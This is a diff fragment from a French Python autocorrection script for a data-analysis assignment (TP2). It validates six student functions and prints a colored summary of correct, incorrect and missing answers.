+            except Exception as e:
+                print_rouge(f"   ❌ Erreur lors de l'exécution de {nom}():")
+                print_rouge(f"      {e}")
+                resultats[nom] = False
+                print()
+                continue
+
+            try:
+                resultats[nom] = valider_resultat(nom, obtenu)
+            except Exception as e:
+                print_rouge(f"   ❌ Erreur lors de la validation du résultat de {nom}():")
+                print_rouge(f"      {e}")
+                resultats[nom] = False
+        print()
+
+    # ── Bilan final ──────────────────────────────────────────────────────────
+    print("*+*" * 26 + "*")
+
+    nb_correctes   = sum(1 for v in resultats.values() if v)
+    nb_incorrectes = sum(1 for v in resultats.values() if not v)
+    nb_testees     = len(resultats)
+
+    if nb_testees == NB_QUESTIONS and nb_incorrectes == 0:
+        print()
+        print_vert("*** ✅ TOUTES LES QUESTIONS D'ANALYSE SONT CORRECTES! 🎉 BRAVO! ***")
+        print_vert("    Les 6 fonctions ont retourné les résultats attendus.")
+
+    else:
+        if nb_incorrectes > 0:
+            print()
+            print_rouge(f"🛑 {nb_incorrectes} question(s) incorrecte(s) sur {nb_testees} testée(s).")
+            print_rouge("   Corrigez les erreurs indiquées ci-dessus et relancez le script.")
+
+        if nb_testees < NB_QUESTIONS and nb_incorrectes == 0 and nb_testees > 0:
+            print()
+            manquantes = [nom for nom in FONCTIONS_ATTENDUES if nom not in fonctions]
+            print_jaune("⚠️  Les fonctions trouvées retournent les bons résultats,")
+            print_jaune(f"   mais il manque encore {NB_QUESTIONS - nb_testees} question(s) :")
+            for nom in manquantes:
+                print_jaune(f"   - {nom}")
+
+        if nb_testees < NB_QUESTIONS and nb_incorrectes > 0:
+            manquantes = [nom for nom in FONCTIONS_ATTENDUES if nom not in fonctions]
+            print()
+            print_jaune(f"⚠️  De plus, {NB_QUESTIONS - nb_testees} fonction(s) manquante(s) : "
+                        + ", ".join(manquantes))
+
+    print()
+
+# ════════════════════════════════════════════════════════════════════════════════
+# 🚀  POINT D'ENTRÉE
+# ════════════════════════════════════════════════════════════════════════════════
+
+print()
+print("*+*" * 26 + "*")
+print(f"  SCRIPT D'AUTOCORRECTION — TP2 : Analyse de données ({VERSION})")
+print("  Section validée : ÉLÉMENTS À ANALYSER (question1 à question6)")
+print("*+*" * 26 + "*")
+print()
+
+etape_0_mise_a_jour()
+etape_1_validation_parametres()
+etape_2_validation_questions()
